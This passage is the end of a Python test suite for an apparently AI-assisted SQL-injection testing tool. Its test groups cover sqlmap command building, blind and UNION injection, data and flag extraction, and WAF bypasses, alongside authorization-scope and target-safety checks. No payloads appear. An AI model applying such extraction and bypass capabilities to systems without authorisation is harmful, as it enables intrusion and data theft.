    from app.services import task_manager, safety, collector
    check("normalize_target 去掉前导空格",
          task_manager.normalize_target(" http://x.test/a ") == "http://x.test/a")
    check("create_task 落库前归一目标",
          "normalize_target" in inspect.getsource(task_manager.create_task))
    check("start_task 修正历史任务的目标",
          "normalize_target(task.target)" in inspect.getsource(task_manager.start_task))
    check("SafeHttpClient.request 兜底 strip URL",
          "(url or \"\").strip()" in inspect.getsource(safety.SafeHttpClient.request))
    check("静态爬虫起点 strip",
          "(start_url or \"\").strip()" in inspect.getsource(collector.crawl_static))


def _endpoint_delete_tests():
    """接口删除：存在的路由 + 关联数据清理 + 运行中任务守卫。"""
    import inspect
    from app.api import collect as collect_api
    src = inspect.getsource(collect_api.delete_endpoint)
    check("提供 DELETE /collect/endpoints/{id}",
          any(getattr(r, "path", "") == "/api/collect/endpoints/{endpoint_id}"
              and "DELETE" in getattr(r, "methods", set())
              for r in collect_api.router.routes))
    check("删除接口会清理漏洞与证据",
          "Evidence" in src and "Vulnerability" in src and "vuln_ids" in src)
    check("删除接口会清理扫描任务与研判",
          "ScanJob" in src and "RiskAssessment" in src)
    check("任务采集中/扫描中禁止删除接口",
          "collecting" in src and "scanning" in src)
    check("删除接口会清理/修剪业务链残链",
          "BusinessChain" in src and "node_ids" in src)


if __name__ == "__main__":
    print("=" * 20, "证据链路单元测试", "=" * 20)
    unit_tests()
    print("=" * 20, "前后缀确定性反推", "=" * 20)
    _derive_ps_tests()
    print("=" * 20, "sqlmap 命令构建与 POST 深入利用", "=" * 20)
    _sqlmap_cmd_tests()
    print("=" * 20, "--dbms 归一与 exploit_mode 致命错误分类", "=" * 20)
    _dbms_normalize_tests()
    print("=" * 20, "深入利用：证据优先 / technique 只放宽", "=" * 20)
    _deep_plan_precedence_tests()
    print("=" * 20, "深入利用：表名解析（含边框行）", "=" * 20)
    _parse_tables_tests()
    print("=" * 20, "UNION 判据收紧 + 前缀自纠", "=" * 20)
    _union_criteria_tests()
    print("=" * 20, "研判探针闭合档", "=" * 20)
    _probe_paren_tests()
    print("=" * 20, "研判探针 bypass 成对档（微型靶场）", "=" * 20)
    _probe_server_tests()
    print("=" * 20, "payload_hint 结构化 meta", "=" * 20)
    _payload_hint_tests()
    print("=" * 20, "char_union 回显型靶点取数", "=" * 20)
    _char_union_tests()
    print("=" * 20, "布尔对时间信号与 false_variant", "=" * 20)
    _bool_pair_tests()
    print("=" * 20, "纯时间盲注兜底（受控时间对）", "=" * 20)
    _time_pair_tests()
    print("=" * 20, "时间盲注 flag 直取", "=" * 20)
    _blind_flag_tests()
    print("=" * 20, "复核队列与进度", "=" * 20)
    _review_progress_tests()
    print("=" * 20, "授权范围归一", "=" * 20)
    _scope_normalize_tests()
    print("=" * 20, "AI 连通性测试路由", "=" * 20)
    _ai_test_route_tests()
    print("=" * 20, "日志清空", "=" * 20)
    _log_clear_tests()
    print("=" * 20, "审计日志清空", "=" * 20)
    _audit_clear_tests()
    print("=" * 20, "接口定向重扫", "=" * 20)
    _endpoint_scan_tests()
    print("=" * 20, "零分隔/错误型绕过", "=" * 20)
    _nosep_tests()
    print("=" * 20, "人工确认 payload 导入", "=" * 20)
    _confirmed_payload_tests()
    print("=" * 20, "错误回显直取", "=" * 20)
    _error_extract_tests()
    print("=" * 20, "追加轮四项结构性补丁", "=" * 20)
    _followup_round_tests()
    print("=" * 20, "AI 熔断与分段超时（P2）", "=" * 20)
    _ai_breaker_tests()
    print("=" * 20, "AI 测试连接（代理绕行）", "=" * 20)
    _ai_test_ai_tests()
    print("=" * 20, "样例结构化 / 查重 / 盲注管控", "=" * 20)
    _dedupe_and_samples_tests()
    print("=" * 20, "无表单 GET 参数发现", "=" * 20)
    _param_guess_tests()
    print("=" * 20, "深入利用目标（schema/flag）", "=" * 20)
    _goal_tests()
    print("=" * 20, "DBMS 剧本选择与噪声清洗", "=" * 20)
    _dbms_sanitize_tests()
    print("=" * 20, "深入利用 P0（库名解析/HTTPS/兄弟参数）", "=" * 20)
    _deep_exploit_p0_tests()
    print("=" * 20, "实战安全（不可达早停/总预算/假成功）", "=" * 20)
    _target_safety_tests()
    print("=" * 20, "影响证明与报告证据", "=" * 20)
    _impact_report_tests()
    print("=" * 20, "接口删除", "=" * 20)
    _endpoint_delete_tests()
    print("=" * 20, "目标 URL 归一", "=" * 20)
    _target_normalize_tests()
    print("=" * 20, "OR/AND 双写绕过", "=" * 20)
    _orand_tests()
    print("=" * 20, "报告 WAF 画像段", "=" * 20)
    _waf_report_tests()
    print("=" * 20, "等价类引擎 + 过滤画像", "=" * 20)
    _grammar_profile_tests()
    print("=" * 20, "知识库绕过标签", "=" * 20)
    _kb_bypass_tests()
    print(f"\n通过 {len(passed)} / 失败 {len(failed)}")
    if failed:
        print("失败项：")
        for name in failed:
            print("  -", name)
        sys.exit(1)
